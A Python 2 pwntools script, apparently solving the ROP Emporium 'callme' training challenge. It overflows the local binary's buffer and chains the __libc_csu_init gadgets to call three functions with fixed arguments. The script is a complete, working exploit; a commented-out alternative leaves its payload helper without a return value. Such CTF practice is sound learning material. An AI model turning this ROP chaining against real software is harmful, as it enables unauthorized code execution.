from pwn import *

fpath = "./callme"
offset = 40

p = process(fpath)
elf = ELF(fpath)
p.recv()

def pop(target_fuc , arg_3 , arg_2 , arg_1):
	addr_pr     	= 0x401b23
	addr_ppr    = 0x401ab1

	payload = p64(addr_pr) + p64(arg_1) + p64(addr_ppr) + p64(arg_2) + p64(arg_3) + p64(target_fuc)

def libc_csu_init( target_fuc , arg_3 , arg_2 , arg_1):
	addr_init = 0x0401B1A
	addr_call = 0x0401B00
	addr_pwnme = elf.symbols["pwnme"]
	
	payload 	=   offset * 'a'
	payload   	+= p64(addr_init) + p64(0) + p64(1) + p64(target_fuc) + p64(arg_3) + p64(arg_2) + p64(arg_1) 
	payload 	+=	p64(addr_call) + 'a' * 56 + p64(addr_pwnme)
	p.sendline(payload)
	sleep(0.5)
	print p.recv()


if __name__ == '__main__':
	# 测试rop
	# addr_usefulFunction	= elf.symbols["usefulFunction"]
	# payload += p64(addr_usefulFunction)
	# 做法一 ： 调用 ROPgadget 的结果中的指令 完成传参 , 但是这种做法不通用 , 因为 pop rdx 的命令 相对少见
	# addr_callme_one      	= elf.symbols["callme_one"]
	# addr_callme_two      	= elf.symbols["callme_two"]
	# addr_callme_three   	= elf.symbols["callme_three"]
	# payload = offset * 'a' 
	# payload += pop(addr_callme_one 	, 3 , 2 , 1 )
	# payload += pop(addr_callme_two 	, 3 , 2 , 1 )
	# payload += pop(addr_callme_three 	, 3 , 2 , 1 )
	# p.sendline(payload) 
	# sleep(1)
	# print p.recv()

	
	# 使用通用gadget 完成传参最后一轮的 p.recv()输出结果
	addr_callme_one      	= elf.got["callme_one"]
	addr_callme_two      	= elf.got["callme_two"]
	addr_callme_three   	= elf.got["callme_three"]
	libc_csu_init(addr_callme_one 	, 3 , 2 , 1 )
	libc_csu_init(addr_callme_two 	, 3 , 2 , 1 )
	libc_csu_init(addr_callme_three , 3 , 2 , 1 )
	
	